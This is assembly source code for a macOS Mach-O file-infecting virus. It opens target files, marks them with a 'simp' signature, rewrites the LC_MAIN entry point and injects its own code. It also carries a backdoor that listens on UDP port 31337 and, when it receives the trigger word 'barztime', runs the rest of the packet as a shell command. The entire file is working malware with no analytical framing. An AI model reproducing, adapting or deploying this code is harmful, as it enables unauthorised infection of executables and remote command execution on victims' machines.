	global start
	default rel

	section .text
start:

v_start:

	push 	rbp

	call 	delta_offset	; save current address
	delta_offset:
	pop 	rbp
	sub 	rbp, 0x6        ; back to v_start

	push 	0x20000c7		; lseek syscall to r10
	pop		r10


init_run:
	push 	0x706d6973		; push "simp" to the stack
	jmp 	simple_write


second_run:
	push 	0x706d4173		; push "sAmp" to the stack
    jmp 	simple_write


simple_write:
	mov 	rax, 0x2000004 	; write for testing
	push	0x1
	pop		rdi
	lea 	rsi,[rsp]
	push	0x4
	pop		rdx
	syscall


open_file:

	mov 	rax, 0x2000005		; open file
	lea 	rdi, [rsp]
	push	0x2 				; read + write
	pop		rsi
	syscall

	jc 		filename_double ; check if file opened correctly

	push	rax				; save file descriptor in r12
	pop		r12	
	lea 	rdi, [r12]		; save for file operations	

	push 	0x00
	push	rsp 			; save stack pointer ('buffer')
	pop		r13
	xor		r15, r15 		; counter


check_infected:

	mov 	rax, r10 		; lseek to end of file
	xor 	rsi, rsi
	push	0x2
	pop		rdx
	syscall

	sub 	rax, 0x4 		; move back 4 bytes
	push	rax
	pop		rsi				; save offset for lseek
	mov 	rax, r10 		; lseek back
	xor 	rdx, rdx
	syscall

	mov 	rax, 0x2000003	; read last bytes
	lea 	rsi, [r13]
	push	0x4
	pop		rdx
	syscall

	cmp 	dword [r13], 0x706d6973		; if infected
	je 		done_reading
							; else, add signature
	mov 	rax, r10 		; lseek to end of file
	xor		rsi, rsi
	push 	0x2
	pop		rdx
	syscall

	mov 	rax, 0x2000004	; add signature (write)
	push 	0x706d6973
	lea 	rsi, [rsp]
	push	0x4
	pop		rdx
	syscall	
	pop 	rax

	mov 	rax, r10 		; lseek to beginning
	xor		rsi, rsi
	xor		rdx, rdx
	syscall


read_again:

	mov 	rax, 0x2000003	; read 4 bytes
	lea 	rsi, [r13]
	push	0x4
	pop		rdx
	syscall
	add 	r15, 0x4		; increase counter

	cmp 	rax, 0x00
	je 		done_reading

	cmp 	dword [r13], 0x80000028	; LC_MAIN entry
	jne 	read_again

	mov 	rax, 0x2000003	; signature found, read first int (other)
	push	0x4 			; have to re-init rdx :(
	pop		rdx
	syscall
	add 	r15, 0x4

	mov 	rax, 0x2000003	; signature found, read entry offset
	push	0x4
	pop		rdx
	syscall

	sub 	word [r13], exit - v_start	; calculate new offset

	mov 	rax, r10 		; lseek to change entry point
	push	r15
	pop		rsi
	xor		rdx, rdx
	syscall

	mov 	rax, 0x2000004 	; write new entry point
	push	0x4
	pop		rdx
	lea 	rsi, [r13]		; new entry point
	syscall

	mov 	rax, r10 		; lseek to entry point
	mov 	rsi, [r13] 		; rewrite?
	xor		rdx, rdx
	syscall

	mov 	rax, 0x2000004 	; write
	push	exit - v_start
	pop		rdx
	lea 	rsi, [rbp]		; saved (relative) offset for v_start
	syscall


done_reading:
	pop 	rax				; pop 'buffer'

	mov 	rax, 0x2000006  ; close
	syscall


filename_double:
    pop 	rax				; pop filename string
    cmp 	rax, 0x706d6973	; compare to initial filename
    je 		second_run		; try other filename


socket_stuff:

	mov 	rax, 0x2000061 	; socket(2, 2, 0)
	push 	0x2 			; AF_INET
	pop 	rdi		
	mov 	rsi, rdi		; SOCK_DGRAM
	xor 	rdx, rdx
	syscall

	mov 	r13, rax		; sockfd

	mov 	rax, 0x2000068	; bind(sockfd, (struct sockaddr *) rawaddress, 16)
	mov 	rdi, r13
							; char rawaddress[] = { 0, 2, 0x7a, 0x69, 0, 0, 0, 0, 0, 0, 0, 0 };
							; sin_family = 2, sin_port = 27002 (31337),  0 = INADDR_ANY
	push 	0x697a0200
	lea 	rsi, [rsp]
	push 	0x10 			; 16
	pop 	rdx
	syscall
	pop 	rax				; fix stack

	mov 	rax, 0x200001d	; recvfrom(sockfd, buffer, 128, 0, 0, 0)

	push 	0x10 			; 128 bytes / 8 = 16 entries needed
	pop 	rcx
	pushloop:
	push 	0x00
	loop 	pushloop

	lea 	rsi, [rsp]
	mov 	rdx, 0x80 		; 128
	xor 	rcx, rcx
	xor 	r8, r8
	xor 	r9, r9
	xor 	r10, r10 		; register is also used :(
	syscall 


test_for_trigger:
	mov 	rax, 0x656d69747a726162	; barztime
	cmp 	[rsp], rax

	jne 	fix_stack


execute_command:
	mov 	rax, 0x200003b	; execve

	add 	rsp, 8 			; skip barztime
	lea 	r14, [rsp]

    cdq                     ; rdx=penv=0
    mov     rbx, [r14]  	; barztime/bin//sh
    push    rbx             ; "/bin//sh"
    push    rsp
    pop     rdi             ; rdi="/bin//sh", 0
    push    rdx             ; 0
    push    word '-c'
    push    rsp
    pop     rbx             ; rbx="-c", 0
    push    rdx             ; argv[3]=NULL
    add 	r14, 8
    push 	r14
    push    rbx             ; argv[1]="-c"
    push    rdi             ; argv[0]="/bin//sh"
    push    rsp
    pop     rsi             ; rsi=argv

    syscall


execute_command_fix_stack:
	push 	0x07 			; 7 pop required
	pop 	rcx
	poploop_com:
	pop 	rax
	loop 	poploop_com

	sub 	rsp, 8


fix_stack:
	push 	0x10 			; 16 pop required
	pop 	rcx
	poploop:
	pop 	rax
	loop 	poploop


close_socket:
	mov rax, 0x2000006		; close
	mov rdi, r13
	syscall


pop rbp						; restore rbp


exit:
	mov 	rax, 0x2000001  ; exit
	xor 	rdi, rdi
	syscall	


section .data
	d: db "b"
